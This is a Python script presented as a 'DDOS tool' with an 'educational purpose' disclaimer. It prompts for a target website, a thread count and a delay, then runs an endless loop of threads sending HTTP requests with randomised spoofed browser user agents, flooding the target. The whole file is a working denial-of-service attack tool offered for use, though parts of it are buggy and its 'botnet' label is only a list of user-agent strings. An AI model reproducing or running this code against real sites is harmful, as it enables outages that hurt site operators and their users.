from http.client import HTTPResponse
from requests.models import HTTPError
import requests
import urllib.request
import threading
import random
import time
agentheaders = []
referweb = []
## Botnet 

def agent_list():
    global agentheaders
    agentheaders.append("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Mobile Safari/537.36")
    agentheaders.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    agentheaders.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    agentheaders.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    agentheaders.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    agentheaders.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
    agentheaders.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
    agentheaders.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
    agentheaders.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    agentheaders.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    agentheaders.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    agentheaders.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    agentheaders.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    agentheaders.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    agentheaders.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    agentheaders.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    agentheaders.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    agentheaders.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    agentheaders.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    agentheaders.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    agentheaders.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    return agentheaders

def referweb():
	global referweb
	referweb.append('http://www.google.com/?q=')
	referweb.append('http://www.usatoday.com/search/results?q=')
	referweb.append('http://engadget.search.aol.com/search?q=')
	return referweb

print("=============================")
print("||                         ||")
print("||   DDOS TOOLS BY DOMGO   ||")
print("|| USE IT AT YOUR OWN RISK ||")
print("|| FOR EDUCATIONAL PURPOSE ||")
print("||   Loaded Botnet : 20    ||")
print("||                         ||")
print("=============================")

while True: #inputting url
	url = input("\nEnter website : \nExample   : https://example.com\nExample 2 : https://example.com/ex\nweb : ")
	try:
		url = str(url)
		break
	except ValueError as e:
		print("Please input valid url!")
		continue
	except EOFError as e:
		print("Please input valid url!")
		continue
#input threads
print("\n\n")
while True:
	threads = input("How many threads you want to use?  \nWARNING SETTING THE THREADS TOO MANY CAN CAUSE LAG\n: ")
	try:
		threads = int(threads)
		break
	except ValueError as e:
		print("Please input valid number!")
	continue
while True:
	sleepbot = input("How long you the want delay between bot? : ")
	try:
		sleepbot = int(sleepbot)
		break
	except ValueError as e:
		print("Please input valid number!")
	continue
agreement = str(input("START ATTACK? y/n \n: "))

def yes():
	agent_list()  
	try:
		reqattack = urllib.request.Request(url)
		reqattack.add_header('User-Agent', random.choice(agentheaders))
		reqattack.add_header('Cache-Control', 'no-cache')
		reqattack.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
		reqattack.add_header('Keep-Alive', random.randint(110,120))
		reqattack.add_header('Connection', 'keep-alive')
		attack = urllib.request.urlopen(reqattack)
		pass
	except requests.exceptions.HTTPError as e:
		print("[===Website Down===]")



if agreement == "y":
	while True:
		for i in range(threads):
			t = threading.Thread(target=yes)
			t.start()
			print("[===Request",i, "sended===]")
			time.sleep(sleepbot)
